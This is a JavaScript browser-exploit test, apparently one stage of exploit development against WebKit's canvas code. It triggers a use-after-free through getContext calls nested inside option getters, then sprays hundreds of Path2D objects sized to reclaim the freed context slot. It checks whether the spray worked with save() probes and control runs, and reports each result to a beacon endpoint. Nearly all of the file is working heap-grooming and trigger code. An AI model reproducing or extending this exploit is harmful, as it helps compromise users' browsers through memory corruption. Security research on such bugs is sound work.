// p507 — Path2D carrier test for cross-type UAF
//
// Path2D uses VectorBufferMalloc = FastMalloc (WTF/wtf/Forward.h:67)
// WTF_MAKE_FAST_ALLOCATED on Path2D itself
// 13 segments × 56B = 728B → same bmalloc size class as the freed 712B context
//
// Cross-type UAF: bitmaprenderer outer + 2d inner
//   → inner 2d context C1 freed by unique_ptr when outer creates bitmaprenderer
//   → dCtx (stale wrapper) has dangling pointer to freed 712B slot
//
// Detection: save() writes uint32=1 at slot+0x250 (m_unrealizedSaveCount)
//   If Path2D buffer occupies the slot, save() won't crash and we detect the write
//   by calling save() twice and verifying increment behavior
//
// If Path2D reclaims: we have a FastMalloc carrier for the canvas UAF forge!
//
// Beacon prefix: V507-
(function() {
  var BASE = location.protocol + '//' + location.host;
  var T0 = Date.now();

  function B(tag, body) {
    try {
      var dt = Date.now() - T0;
      var x = new XMLHttpRequest();
      x.open('POST', BASE + '/beacon/V507-' + tag, false);
      x.setRequestHeader('Content-Type', 'text/plain');
      x.send('[' + dt + 'ms] ' + (body || ''));
    } catch(e) {}
  }

  B('BOOT', navigator.userAgent);

  // ═══════════════════════════════════════════════════════════
  // Step 1: Build source Path2D with exactly 13 segments (728B buffer)
  // ═══════════════════════════════════════════════════════════
  //
  // Each PathSegment is 56 bytes in the Vector<PathSegment> buffer.
  // We fill 13 segments to get 13×56 = 728B.
  // Segment 2 lands at buffer+0x70 (= m_stateStack position in context layout)
  //
  // At buffer+0x250 = byte 592, that's segment index 10 (592/56 = 10.57)
  // Segment 10 starts at 10×56 = 560 (0x230)
  // Offset 0x250 is at 592 - 560 = 32 bytes INTO segment 10
  //
  // We use quadraticCurveTo for most segments (4 floats = 16 bytes of payload,
  // plus type discriminator and other variant overhead within the 56B segment)

  var srcPath = new Path2D();
  // Segment 0: moveTo
  srcPath.moveTo(1.0, 2.0);
  // Segments 1-12: lineTo (simple, 12 more segments)
  for (var i = 1; i <= 12; i++) {
    srcPath.lineTo(i * 10.0, i * 20.0);
  }
  B('SRC-PATH', 'segments=13');

  // ═══════════════════════════════════════════════════════════
  // Step 2: Check bitmaprenderer availability
  // ═══════════════════════════════════════════════════════════
  var testC = document.createElement('canvas');
  testC.width = 1; testC.height = 1;
  var testBM = null;
  try { testBM = testC.getContext('bitmaprenderer'); } catch(e) {}
  var hasBitmap = !!testBM;
  B('BITMAP', 'available=' + hasBitmap);
  testC = null; testBM = null;

  // ═══════════════════════════════════════════════════════════
  // Step 3: Trigger the UAF
  // ═══════════════════════════════════════════════════════════
  var dCtx = null;
  var triggerCanvas = document.createElement('canvas');
  triggerCanvas.width = 10; triggerCanvas.height = 10;
  document.body.appendChild(triggerCanvas);
  var callCount = 0;

  if (hasBitmap) {
    // Cross-type: bitmaprenderer outer + 2d inner → frees 2d context entirely
    var settings = {};
    Object.defineProperty(settings, 'alpha', {
      get: function() {
        callCount++;
        if (callCount === 1) {
          dCtx = triggerCanvas.getContext('2d');
        }
        return true;
      }
    });
    var bmCtx = triggerCanvas.getContext('bitmaprenderer', settings);
    B('CROSSTYPE-UAF', 'dCtx=' + !!dCtx + ',bmCtx=' + !!bmCtx + ',cc=' + callCount);
  } else {
    // Fallback: same-type UAF via desynchronized getter
    var settings2 = {};
    Object.defineProperty(settings2, 'desynchronized', {
      get: function() {
        callCount++;
        if (callCount === 1) {
          dCtx = triggerCanvas.getContext('2d');
        }
        return false;
      }
    });
    var outerCtx = triggerCanvas.getContext('2d', settings2);
    B('SAMETYPE-UAF', 'dCtx=' + !!dCtx + ',outerCtx=' + !!outerCtx + ',cc=' + callCount);
  }

  if (!dCtx) {
    B('ABORT', 'dCtx not created - getter did not fire');
    return;
  }

  // ═══════════════════════════════════════════════════════════
  // Step 4: Path2D spray — fill the freed slot
  // ═══════════════════════════════════════════════════════════
  //
  // new Path2D(srcPath) copies the segments → allocates 728B buffer via FastMalloc
  // We spray 500 copies to maximize the chance of hitting the freed slot

  var NUM_P2D = 500;
  var p2dSpray = [];
  for (var i = 0; i < NUM_P2D; i++) {
    p2dSpray.push(new Path2D(srcPath));
  }
  B('PATH2D-SPRAY', 'count=' + NUM_P2D);

  // ═══════════════════════════════════════════════════════════
  // Step 5: save() marker test
  // ═══════════════════════════════════════════════════════════
  //
  // save() does ++m_unrealizedSaveCount at slot+0x250, no pointer deref
  // If Path2D buffer is there: writes 1 into the segment data (no crash)
  // If memory is decommitted: SIGSEGV (crash)
  // If nothing reclaimed but page still mapped: writes 1 to freed memory (no crash,
  //   but then the second save() would write 2, proving the slot is ours)

  var save1ok = false;
  try {
    dCtx.save();
    save1ok = true;
  } catch(e) {
    B('SAVE1-ERR', e.name + ':' + e.message);
  }
  B('SAVE1', 'ok=' + save1ok);

  if (!save1ok) {
    B('DEAD', 'save() crashed - slot decommitted or unmapped');
    return;
  }

  // save() didn't crash! The slot has something in it.
  // Call save() again → should increment to 2
  var save2ok = false;
  try {
    dCtx.save();
    save2ok = true;
  } catch(e) {
    B('SAVE2-ERR', e.name + ':' + e.message);
  }
  B('SAVE2', 'ok=' + save2ok);

  // restore() decrements the count. If we did 2 saves, 2 restores → count back to 0
  var restore1ok = false, restore2ok = false;
  try { dCtx.restore(); restore1ok = true; } catch(e) { B('RESTORE1-ERR', e.name); }
  try { dCtx.restore(); restore2ok = true; } catch(e) { B('RESTORE2-ERR', e.name); }
  B('RESTORE', 'r1=' + restore1ok + ',r2=' + restore2ok);

  // ═══════════════════════════════════════════════════════════
  // Step 6: Verify it's actually Path2D (not stale mapped memory)
  // ═══════════════════════════════════════════════════════════
  //
  // Control test: trigger UAF again on a FRESH canvas, do NOT spray, call save()
  // If that also works → the page is still mapped (freed memory not decommitted)
  // If it crashes → the spray is what made save() work → Path2D RECLAIMED

  var controlCanvas = document.createElement('canvas');
  controlCanvas.width = 10; controlCanvas.height = 10;
  document.body.appendChild(controlCanvas);
  var controlCtx = null;
  var cc2 = 0;

  if (hasBitmap) {
    var cs = {};
    Object.defineProperty(cs, 'alpha', {
      get: function() { cc2++; if (cc2 === 1) controlCtx = controlCanvas.getContext('2d'); return true; }
    });
    controlCanvas.getContext('bitmaprenderer', cs);
  } else {
    var cs2 = {};
    Object.defineProperty(cs2, 'desynchronized', {
      get: function() { cc2++; if (cc2 === 1) controlCtx = controlCanvas.getContext('2d'); return false; }
    });
    controlCanvas.getContext('2d', cs2);
  }

  B('CONTROL-UAF', 'controlCtx=' + !!controlCtx);

  if (controlCtx) {
    // Do NOT spray. Just try save() on the un-reclaimed freed slot.
    var controlSaveOk = false;
    try {
      controlCtx.save();
      controlSaveOk = true;
    } catch(e) {
      B('CONTROL-SAVE-ERR', e.name + ':' + e.message);
    }
    B('CONTROL-SAVE', 'ok=' + controlSaveOk);

    // Interpretation:
    // spray save OK + control save FAIL → PATH2D RECLAIMED THE SLOT
    // spray save OK + control save OK → memory still mapped (inconclusive)
    // spray save FAIL + control save FAIL → both decommitted (dead)
    if (save1ok && !controlSaveOk) {
      B('RESULT', 'PATH2D-RECLAIMED! Spray save OK, control save CRASHED');
    } else if (save1ok && controlSaveOk) {
      B('RESULT', 'INCONCLUSIVE: both save OK, freed page still mapped');
    } else {
      B('RESULT', 'DEAD: spray=' + save1ok + ' control=' + controlSaveOk);
    }
  }

  // ═══════════════════════════════════════════════════════════
  // Step 7: Additional verification — vary spray count
  // ═══════════════════════════════════════════════════════════
  // Try with a smaller spray (50) and a single Path2D to check determinism

  var canvas3 = document.createElement('canvas');
  canvas3.width = 10; canvas3.height = 10;
  document.body.appendChild(canvas3);
  var ctx3 = null;
  var cc3 = 0;

  if (hasBitmap) {
    var s3 = {};
    Object.defineProperty(s3, 'alpha', {
      get: function() { cc3++; if (cc3 === 1) ctx3 = canvas3.getContext('2d'); return true; }
    });
    canvas3.getContext('bitmaprenderer', s3);
  } else {
    var s3b = {};
    Object.defineProperty(s3b, 'desynchronized', {
      get: function() { cc3++; if (cc3 === 1) ctx3 = canvas3.getContext('2d'); return false; }
    });
    canvas3.getContext('2d', s3b);
  }

  if (ctx3) {
    // Small spray: just 50 Path2D
    var smallSpray = [];
    for (var j = 0; j < 50; j++) {
      smallSpray.push(new Path2D(srcPath));
    }
    var small_ok = false;
    try { ctx3.save(); small_ok = true; } catch(e) {}
    B('SMALL-SPRAY', 'count=50,save_ok=' + small_ok);
  }

  // ═══════════════════════════════════════════════════════════
  // Step 8: Also test AB spray as comparison (expected: FAIL)
  // ═══════════════════════════════════════════════════════════
  var canvas4 = document.createElement('canvas');
  canvas4.width = 10; canvas4.height = 10;
  document.body.appendChild(canvas4);
  var ctx4 = null;
  var cc4 = 0;

  if (hasBitmap) {
    var s4 = {};
    Object.defineProperty(s4, 'alpha', {
      get: function() { cc4++; if (cc4 === 1) ctx4 = canvas4.getContext('2d'); return true; }
    });
    canvas4.getContext('bitmaprenderer', s4);
  } else {
    var s4b = {};
    Object.defineProperty(s4b, 'desynchronized', {
      get: function() { cc4++; if (cc4 === 1) ctx4 = canvas4.getContext('2d'); return false; }
    });
    canvas4.getContext('2d', s4b);
  }

  if (ctx4) {
    var abSpray = [];
    for (var k = 0; k < 500; k++) {
      abSpray.push(new ArrayBuffer(728));
    }
    var ab_ok = false;
    try { ctx4.save(); ab_ok = true; } catch(e) {}
    B('AB-COMPARE', 'count=500,save_ok=' + ab_ok);
  }

  B('DONE', 'all tests complete');
})();
